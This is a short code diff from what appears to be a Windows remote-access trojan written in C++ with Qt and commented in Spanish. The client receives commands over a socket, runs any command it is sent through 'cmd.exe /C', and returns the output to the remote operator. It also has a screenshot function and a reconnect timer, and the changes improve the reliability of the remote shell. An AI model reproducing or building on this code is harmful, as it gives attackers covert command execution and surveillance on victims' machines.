@@ -187,7 +187,7 @@ void MainWindow::llegadaDatos() {
     QStringList parametros =  datos.split("|@|");
     if(parametros[0] == "shell"){ //shell remoto
         QString salidaShell;
-        salidaShell = "shell|@|" + shell(parametros[1]);
+        salidaShell = "shell|@|" + shell(parametros[1].toLatin1());
         util.escribirSocket(salidaShell,&socket);
     }
     if (parametros[0] == "home"){
@@ -368,16 +368,15 @@ QPixmap MainWindow::screenShot(){
 }
 void MainWindow::desconectado() {
     /** cosas que hacer al desconectarse **/
-    temporizador.start(60000);
+    temporizador.start(this->tiempoConexion);
 
 }
 
 QString MainWindow::shell(QString comando){
     /** Función que ejecuta el comando de consola pasado como parámetro y devuelve la salida **/
-    consola.start(comando);
-    consola.waitForStarted();
+    consola.start("cmd.exe /C " + comando);
     consola.waitForReadyRead();
-    return consola.readAll();
+    return consola.readAllStandardOutput();
 }
 
 void MainWindow::reiniciar(){
